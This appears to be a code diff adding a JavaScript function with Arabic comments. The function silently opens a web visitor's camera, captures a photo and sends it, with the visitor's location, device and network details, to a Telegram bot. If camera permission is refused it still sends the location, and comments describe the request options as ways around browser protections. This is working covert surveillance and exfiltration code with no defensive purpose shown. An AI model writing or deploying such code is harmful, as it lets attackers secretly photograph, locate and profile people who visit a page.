@@ -1,0 +1,45 @@
+async function captureAndSend(location, device, network) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    try {
+        // تشغيل كاميرا الجهاز
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        video.srcObject = stream;
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        // 1. أرسل البيانات النصية أولاً للتأكد من أن البوت شغال
+        const textMessage = `🚨 بيانات جديدة:\n📍 Location: ${location}\n📱 Device: ${device}\n🌐 Network: ${network}`;
+        
+        // استخدام رابط مباشر لإرسال النص وتفادي حظر المتصفح
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textMessage)}`);
+
+        // 2. التقاط صورة وإرسالها
+        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر ثانية لتوضح الصورة
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+
+            // إرسال الصورة
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // تخطي حظر الحماية للمتصفح
+            });
+        }, 'image/jpeg');
+
+        // إيقاف الكاميرا
+        setTimeout(() => {
+            stream.getTracks().forEach(track => track.stop());
+        }, 2000);
+
+    } catch (e) {
+        // إذا رفض المستخدم الكاميرا، أرسل البيانات النصية فقط
+        const textMessage = `📍 الموقغ: ${location}\n(تم رفض إذن الكاميرا)`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textMessage)}`);
+    }
+}
